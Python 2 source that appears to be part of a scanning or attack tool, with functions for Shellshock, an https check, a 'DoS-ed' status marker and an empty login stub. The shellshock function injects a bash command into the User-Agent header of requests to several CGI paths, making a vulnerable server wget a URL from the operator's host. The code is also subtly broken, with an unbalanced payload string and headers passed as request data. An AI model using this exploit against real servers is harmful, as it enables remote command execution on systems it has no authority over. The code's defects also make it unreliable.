import requests, time, sys, os

def localize(d):
	l = r""
	for _ in d:
		g = d[_]
		if type(d[_]) == str:
			g = "\"%s\""%d[_]
		l += str(_)+"="+str(g)+";"
	return l

def shellshock(info, tran):
	locals().update(tran)
	exec localize(info)
	isvuln1 = False
	site = ip
	for _ in ["/cgi-sys/entropysearch.cgi","/cgi-sys/defaultwebpage.cgi","/cgi-mod/index.cgi","/cgi-bin/test.cgi","/cgi-bin-sdb/printenv"]:
		try:
			if "http" not in site:
				site = "http://"+site
			conn = requests.session()
			conf = "() { ignored;};/bin/bash -c 'wget http://%s:%s/%s');'" %(netaddr.localhost, _servport, secauth)
			header = {"Content-type": "application/x-www-form-urlencoded", "User-Agent":conf}
			res = conn.get(site, data=header, timeout=args.ttl, verify=False)
			conn.close()
			resp = res.status_code
			if resp == 200:
				isvuln1 = True
				break
		except Exception as e:
			pass
	if not isvuln1:
		tracking.autosecure(ip, "shellshock")

def https(info, tran):
	exec localize(info)
	locals().update(tran)
	if 80 in scanports and 443 not in scanports:
		tracking.autovuln(ip, "https")
	elif ip+".md" in os.listdir(tracking.mdir):
		v = open(tracking.mdir+ip+".md").read().count(vulns["https"])/2.0
		if v.is_integer() == False and v != 0.0:
			tracking.autosecure(ip, "https")

def dos(info, tran):
	exec localize(info)
	locals().update(tran)
	tracking.update(ip, "DoS-ed")

def login(info, tran):
	exec localize(info)
	locals().update(tran)
